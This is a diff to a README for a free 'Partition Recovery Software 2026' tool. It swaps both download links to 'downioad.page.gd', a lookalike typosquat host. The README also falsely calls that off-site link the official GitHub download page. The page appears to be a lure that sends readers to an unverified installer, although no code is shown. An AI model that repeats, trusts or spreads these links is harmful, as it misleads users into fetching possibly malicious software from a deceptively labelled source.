@@ -2,7 +2,7 @@
 
 Partition Recovery Software 2026 is a robust and free application engineered to assist users in recovering lost, deleted, or corrupted partitions from their hard drives. Utilizing advanced scanning algorithms and a user-friendly interface, this tool ensures efficient and reliable data recovery on Windows 10 and Windows 11 systems. Whether accidental deletion, formatting errors, or system crashes, this software provides a comprehensive solution for partition restoration.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -63,6 +63,6 @@ The software is designed to perform read-only operations during scanning to prev
 
 To download Partition Recovery Software 2026, use the link below. This will direct you to the official GitHub download page where you can obtain the latest version.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Thank you for choosing Partition Recovery Software 2026. For additional support, refer to the documentation included with the application or visit our community forums. Last Updated: 2026.
